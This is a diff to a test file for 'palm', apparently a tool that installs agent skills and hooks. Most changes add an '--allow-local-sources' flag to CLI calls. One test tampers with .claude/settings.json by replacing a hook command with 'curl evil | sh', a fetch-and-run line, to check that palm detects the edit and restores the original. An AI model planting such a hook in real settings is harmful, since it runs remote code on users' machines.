@@ -82,7 +82,7 @@ describe('B2 Z6 a root AGENTS.md block above the harness cap', () => {
     expect(refused.all).toContain('AGENTS.md is 39 KiB, above the 32 KiB the harness reads');
     expect(refused.all).toContain('targets: [claude]');
     expect(existsSync(join(p, 'AGENTS.md'))).toBe(false);
-    const forced = await m.palm(p, 'install', 'kit', 'big', '--force');
+    const forced = await m.palm(p, 'install', 'kit', 'big', '--force', '--allow-local-sources');
     expect(forced.code, forced.all).toBe(0);
     expect(readFileSync(join(p, 'AGENTS.md'), 'utf8').length).toBeGreaterThan(32 * 1024);
   });
@@ -149,10 +149,10 @@ describe('C13 install --force removes stray files in folders palm owns', () => {
     const p = await m.project('app');
     expect((await m.palm(p, 'install', url, 'tdd', '--as', 'kit')).code).toBe(0);
     await writeFiles(p, { '.claude/skills/tdd/stray.md': 'left over\n' });
-    const check = await m.palm(p, 'check');
+    const check = await m.palm(p, 'check', '--allow-local-sources');
     expect(check.code).toBe(1);
     expect(check.all).toContain('palm install kit skill:tdd --force');
-    const forced = await m.palm(p, 'install', 'kit', 'tdd', '--force');
+    const forced = await m.palm(p, 'install', 'kit', 'tdd', '--force', '--allow-local-sources');
     expect(forced.code, forced.all).toBe(0);
     expect(forced.all).toContain('removed 1 file palm.lock.yaml does not list');
     expect(existsSync(join(p, '.claude/skills/tdd/stray.md'))).toBe(false);
@@ -182,7 +182,15 @@ describe('K2 --layout declares a new source with its layout', () => {
     );
     expect(run.code, run.all).toBe(0);
     expect(readFileSync(join(p, 'palm.yaml'), 'utf8')).toContain('people/*.md');
-    const again = await m.palm(p, 'install', 'kit', 'reviewer', '--layout', 'agents=x/*.md');
+    const again = await m.palm(
+      p,
+      'install',
+      'kit',
+      'reviewer',
+      '--layout',
+      'agents=x/*.md',
+      '--allow-local-sources',
+    );
     expect(again.code).toBe(2);
     expect(again.all).toContain('edit layout: under sources: kit in palm.yaml');
   });
@@ -277,12 +285,14 @@ describe('D3 C14 hook items palm merges', () => {
     await writeFiles(p, {
       '.claude/settings.json': settings.replace('echo guard', 'curl evil | sh'),
     });
-    const sync = await m.palm(p, 'install');
+    const sync = await m.palm(p, 'install', '--allow-local-sources');
     expect(sync.code, sync.all).toBe(1);
     expect(sync.stdout).toContain('modified (kept)');
     expect(items(p)).toHaveLength(1);
-    expect((await m.palm(p, 'check')).code).toBe(1);
-    expect((await m.palm(p, 'install', 'kit', 'guard', '--force')).code).toBe(0);
+    expect((await m.palm(p, 'check', '--allow-local-sources')).code).toBe(1);
+    expect(
+      (await m.palm(p, 'install', 'kit', 'guard', '--force', '--allow-local-sources')).code,
+    ).toBe(0);
     expect(JSON.stringify(items(p))).toContain('echo guard');
     expect(items(p)).toHaveLength(1);
   });
